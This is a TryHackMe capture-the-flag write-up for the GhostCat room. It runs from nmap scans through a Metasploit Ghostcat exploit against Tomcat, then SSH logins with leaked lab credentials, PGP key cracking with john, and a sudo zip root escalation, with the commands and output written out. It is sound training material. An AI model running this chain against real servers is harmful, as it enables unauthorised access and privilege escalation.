---
title: TryHackMe GhostCat -- Writeup
date: 2022-03-04
categories: [TryHackMe, Easy]
tags: [ctf, linux, tomcat, exploit-db, mis-config]     # TAG names should always be lowercase
---
`export ip=10.10.2.234`

### nmap basic

```bash
nmap $ip

PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy
MAC Address: 02:D6:2B:FE:BC:A9 (Unknown)

```

### nmap --script=vuln -sCV

```bash
nmap --script=vuln -sCV $ip

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /examples/: Sample scripts
|_  /docs/: Potentially interesting folder
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 02:D6:2B:FE:BC:A9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Next shoudl be inspecting 8080, 8009, and 53. since 22 is ssh i might not waste
my time on it.

Port 8080 is tomcat default installation welcome page (seemingly fine?) Port
8009 is ajp13 protocol. well.. The server seems ok right?. so now its time todo
some manual enumeration, searching the tomcat version i found it vulnerable
`Apache Tomcat 9.0.30` to Ghostcat. An easy to get things working by using
metasploit

```bash
msfconsole
search GhostCat
use 0
set rhost 10.10.2.234
run
```

after running the exploiwe can see a welcome msg with probably credentials
`skyfuck:8730281lkjlkjdqlksalks`<br>Lets try using ssh with this creds
`ssh skyfuck@$ip` Oh shit.. it works :)

### Enum as skyfuck

user directory

```bash
drwxr-xr-x 3 skyfuck skyfuck 4.0K Apr  3 20:09 .
drwxr-xr-x 4 root    root    4.0K Mar 10  2020 ..
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3.7K Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4.0K Apr  3 20:09 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5.1K Mar 10  2020 tryhackme.asc

```

We got .pgp and .asc files. alright lets try to decrypt it. running pgp --import
on the box gives me bs error. so i just move the files to my machine and
manually decrpt it.

```bash
"Host"
scp skyfuck@10.10.200.225:/home/skyfuck/credential.pgp cred.pgp
scp skyfuck@10.10.200.225:/home/skyfuck/tryhackme.asc key.asc

```

## Cracking .asc with john

```bash
/usr/lib/john/gpg2john key.asc > hash
john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
john hash --show
```

Alright, now we got passwd for the gpg. we can use gnugpg to read the text

```bash
gpg --import key.asc
gpg --decrypt cred.pgp

gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoil***********************g3k12j3kj123j
```

got merlin creds, lets log as him `ssh merlin@$ip`

### Enum as merlin

```bash
sudo -l

Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

You know the vibes from here, GTFObins timeeeee

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'h #'
sudo rm $TF
```

Thanks for reading, Hope this helps :)
